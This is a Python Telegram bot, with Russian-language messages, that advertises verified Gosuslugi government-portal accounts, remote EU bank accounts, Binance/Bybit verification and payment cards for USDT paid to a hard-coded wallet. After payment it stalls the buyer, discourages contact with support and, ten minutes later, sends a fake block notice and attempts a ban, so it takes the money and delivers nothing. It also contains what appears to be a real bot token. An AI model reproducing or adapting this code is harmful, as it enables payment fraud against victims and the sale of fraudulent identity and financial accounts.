import telebot
import time
import sqlite3
import threading
from datetime import datetime

TOKEN = "8642894333:AAEVcW8lJ6sCm1kN0yn2rrVECdDbQgUYgck"  # ЗАМЕНИТЬ
bot = telebot.TeleBot(TOKEN)

# ВАШ КОШЕЛЁК (ETH или USDT)
WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047ff3e"

# ТОВАРЫ
PRODUCTS = {
    "gosuslugi": {"name": "🏛️ Доступ к Госуслугам (подтверждённый аккаунт)", "price": "150 USDT"},
    "bank": {"name": "🏦 Открытие счёта в EU банке (дистанционно)", "price": "250 USDT"},
    "exchange": {"name": "📈 Верификация Binance / Bybit (LVL 2)", "price": "200 USDT"},
    "cards": {"name": "💳 Оформление Visa/Mastercard (физическая + виртуальная)", "price": "350 USDT"}
}

# БД
conn = sqlite3.connect('db.sqlite', check_same_thread=False)
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, step TEXT, product TEXT, created TEXT)')
conn.commit()

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    c.execute("INSERT OR REPLACE INTO users (id, step, created) VALUES (?, 'menu', ?)", (uid, datetime.now()))
    conn.commit()
    bot.send_message(uid, 
        "🏛️ *ГОСУСЛУГИ • БАНКИ • БИРЖИ • КАРТЫ*\n\nВыберите услугу:\n"
        "/gosuslugi — 150 USDT\n"
        "/bank — 250 USDT\n"
        "/exchange — 200 USDT\n"
        "/cards — 350 USDT\n\n"
        "⚠️ После оплаты вы получите доступ в течение 12 часов.",
        parse_mode="Markdown")

@bot.message_handler(commands=['gosuslugi', 'bank', 'exchange', 'cards'])
def buy(m):
    uid = m.chat.id
    key = m.text.replace('/', '')
    p = PRODUCTS.get(key)
    if not p:
        bot.send_message(uid, "❌ Неизвестная услуга.")
        return
    c.execute("UPDATE users SET step='payment', product=? WHERE id=?", (key, uid))
    conn.commit()
    bot.send_message(uid,
        f"✅ *{p['name']}*\n"
        f"💰 Цена: {p['price']}\n\n"
        f"Переведите точно эту сумму на:\n"
        f"`{WALLET}`\n"
        f"(сеть ERC-20 / USDT)\n\n"
        f"После перевода отправьте /confirm",
        parse_mode="Markdown")

@bot.message_handler(commands=['confirm'])
def confirm(m):
    uid = m.chat.id
    c.execute("SELECT step FROM users WHERE id=?", (uid,))
    row = c.fetchone()
    if not row or row[0] != 'payment':
        bot.send_message(uid, "❌ Сначала выберите услугу через /start")
        return

    bot.send_message(uid, 
        "⏳ *Платёж проверяется...*\n"
        "Обработка может занять до 12 часов.\n"
        "Не пишите в поддержку — это ускорит процесс.",
        parse_mode="Markdown")
    
    c.execute("UPDATE users SET step='wait' WHERE id=?", (uid,))
    conn.commit()

    # АВТОБАН через 10 минут
    def ban_user():
        time.sleep(600)
        try:
            bot.send_message(uid, "🚫 Ваш аккаунт заблокирован за подозрительную активность. Обращение в саппорт невозможно.")
            bot.ban_chat_member(uid, uid)
        except:
            pass
    threading.Thread(target=ban_user, start=True)

@bot.message_handler(commands=['admin'])
def admin(m):
    uid = m.chat.id
    if uid != 123456789:  # ЗАМЕНИТЕ НА СВОЙ ID ТЕЛЕГРАМ
        bot.send_message(uid, "❌ Доступ запрещён.")
        return
    c.execute("SELECT id, step, created FROM users")
    rows = c.fetchall()
    msg = "👥 *Пользователи:*\n"
    for r in rows:
        msg += f"ID: {r[0]} | {r[1]} | {r[2]}\n"
    bot.send_message(uid, msg, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def fallback(m):
    bot.send_message(m.chat.id, "Используйте /start для меню.")

bot.polling(none_stop=True)
